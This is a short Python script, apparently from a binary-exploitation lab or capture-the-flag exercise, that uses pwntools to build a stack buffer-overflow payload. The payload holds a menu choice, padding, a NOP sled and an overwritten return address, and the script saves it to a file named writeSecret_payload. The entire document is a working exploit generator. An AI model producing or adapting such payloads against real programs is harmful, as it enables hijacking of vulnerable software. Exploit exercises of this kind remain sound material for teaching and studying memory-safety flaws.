#!/usr/bin/env python3

from pwn import *
 

# Return address in little endian format
offset=295
ret_addr = 0x555555555229
addr = p64(ret_addr, endian='little')
log.info("Return address: %#.16x" % (ret_addr))

# Opcode for the NOP instruction
nop = asm('nop', arch="amd64")


# Writes payload on a file
payload=b"2\n" + b"A"*(1022 ) + offset*nop + addr
log.info("Payload ready")


write_secret_payload = "./writeSecret_payload"

with open(write_secret_payload, "wb") as f:
        f.write(payload)

log.info("Payload saved into %s" % write_secret_payload)



